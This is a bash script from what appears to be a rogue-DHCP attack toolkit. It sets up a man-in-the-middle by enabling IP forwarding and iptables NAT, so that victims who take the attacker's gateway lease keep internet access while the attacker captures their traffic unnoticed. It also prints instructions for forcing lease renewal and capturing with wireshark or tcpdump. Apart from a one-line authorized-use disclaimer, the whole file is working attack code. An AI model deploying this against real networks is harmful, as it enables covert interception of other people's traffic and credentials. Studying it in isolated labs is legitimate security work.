#!/usr/bin/env bash
# Phase 4 - man in the middle.
# Once victims take our rogue lease (gateway = attacker), turn on IP forwarding
# and NAT so their traffic still reaches the internet through us - that way we
# can capture everything without them noticing they're offline.
#   sudo ./enable_mitm.sh <victim_iface> <uplink_iface>
#   sudo ./enable_mitm.sh --disable      # undo it
# Authorized, isolated networks only - see ../../DISCLAIMER.md.
set -euo pipefail

if [[ $EUID -ne 0 ]]; then
  echo "[-] run as root (sudo)" >&2
  exit 1
fi

if [[ "${1:-}" == "--disable" ]]; then
  echo "[*] turning off forwarding and clearing NAT rules"
  sysctl -w net.ipv4.ip_forward=0
  iptables -t nat -F
  iptables -F FORWARD
  echo "[+] done"
  exit 0
fi

VICTIM_IFACE="${1:-eth0}"    # side facing the victims (rogue DHCP)
UPLINK_IFACE="${2:-wlan0}"   # side with real internet

echo "[*] enabling IPv4 forwarding"
sysctl -w net.ipv4.ip_forward=1

echo "[*] NAT: ${VICTIM_IFACE} (victims) -> ${UPLINK_IFACE} (internet)"
iptables -t nat -A POSTROUTING -o "${UPLINK_IFACE}" -j MASQUERADE
iptables -A FORWARD -i "${UPLINK_IFACE}" -o "${VICTIM_IFACE}" \
         -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i "${VICTIM_IFACE}" -o "${UPLINK_IFACE}" -j ACCEPT

echo
echo "[+] forwarding is on. Now:"
echo "    1. make the victim renew its lease:"
echo "         Windows: ipconfig /release && ipconfig /renew"
echo "         Linux:   sudo dhclient -r && sudo dhclient"
echo "    2. capture: wireshark -i ${VICTIM_IFACE}  (or tcpdump -i ${VICTIM_IFACE} -w capture.pcap)"
echo "    undo with: sudo $0 --disable"
